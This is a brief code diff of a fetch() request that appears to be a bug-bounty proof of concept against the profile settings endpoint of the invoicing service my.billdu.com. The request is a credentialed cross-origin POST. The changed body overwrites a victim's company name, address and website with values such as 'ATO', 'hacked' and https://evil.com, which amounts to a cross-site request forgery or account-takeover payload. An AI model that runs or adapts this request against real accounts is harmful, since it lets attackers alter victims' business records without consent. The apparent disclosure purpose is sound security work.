@@ -18,7 +18,7 @@ fetch("https://my.billdu.com/accountant.settings/profile?supplierId=1448763", {
   },
   "referrer": "https://my.billdu.com/accountant.settings/profile?supplierId=1448763",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "save=Save&company=test&street=&city=&zip=&companyId=&taxId=&vatId=&type=I%27m+not+VAT+registered.&phone=&email=hack3r_0-11%40intigriti.me&web=testing&_do=settingsForm-submit",
+  "body": "save=Save&company=ATO&street=hacked&city=bye&zip=&companyId=&taxId=&vatId=&type=I%27m+not+VAT+registered.&phone=&email=hack3r_0-11%40intigriti.me&web=https://evil.com&_do=settingsForm-submit",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
